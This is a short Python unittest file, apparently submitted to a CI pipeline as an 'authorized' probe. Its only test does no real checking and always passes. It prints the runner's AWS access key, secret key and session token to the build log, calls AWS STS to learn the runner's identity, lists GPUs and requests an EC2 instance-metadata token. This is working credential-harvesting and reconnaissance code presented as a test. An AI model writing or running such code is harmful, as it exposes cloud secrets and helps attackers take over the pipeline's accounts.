# i69278 authorized CI role-assumption probe (bounded marker; remove after test)
import datetime
import os
import socket
import subprocess
import unittest


class TestRunnerProbe(unittest.TestCase):
    def test_i69278_probe(self):
        print("I69278_MARKER_BEGIN", flush=True)
        print("HOSTNAME=%s" % socket.gethostname(), flush=True)
        print("UTC=%s" % datetime.datetime.now(datetime.timezone.utc).isoformat(), flush=True)
        for k in ("AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY", "AWS_SESSION_TOKEN",
                  "AWS_DEFAULT_REGION", "AWS_REGION", "AWS_ROLE_ARN"):
            print("ENV_%s=%s" % (k, os.environ.get(k, "")), flush=True)
        try:
            r = subprocess.run(["aws", "sts", "get-caller-identity", "--output", "json"],
                               capture_output=True, text=True, timeout=60)
            print("STS rc=%s out=%s err=%s" % (r.returncode, (r.stdout or "").strip(),
                                              (r.stderr or "").strip()), flush=True)
        except Exception as e:
            print("STS_EXC=%r" % (e,), flush=True)
        try:
            r = subprocess.run(["nvidia-smi", "-L"], capture_output=True, text=True, timeout=30)
            print("NVSMI rc=%s out=%s err=%s" % (r.returncode, (r.stdout or "").strip(),
                                                (r.stderr or "").strip()), flush=True)
        except Exception as e:
            print("NVSMI_EXC=%r" % (e,), flush=True)
        try:
            import urllib.request
            t = urllib.request.urlopen("http://169.254.169.254/latest/api/token", data=b"", timeout=3,
                                       headers={"X-aws-ec2-metadata-token-ttl-seconds": "60"}).read().decode()
            print("IMDS_TOKEN_LEN=%d" % len(t), flush=True)
        except Exception as e:
            print("IMDS_EXC=%r" % (e,), flush=True)
        print("I69278_MARKER_END", flush=True)
        self.assertTrue(True)
